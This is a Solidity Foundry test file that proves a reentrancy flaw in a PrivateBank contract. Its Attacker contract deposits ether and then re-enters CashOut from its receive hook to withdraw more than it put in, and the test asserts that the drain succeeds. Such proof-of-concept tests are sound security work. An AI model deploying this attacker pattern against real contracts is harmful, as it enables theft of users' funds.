
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank} from "../src/PrivateBank.sol";
import {Log} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {
    PrivateBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new PrivateBank(address(log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    PrivateBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = PrivateBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        
        victim.CashOut(val);
        
        if (attackCallCount > 1 && address(victim).balance < initialSnapshot - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.CashOut(storedAttackVal);
        }
    }
}
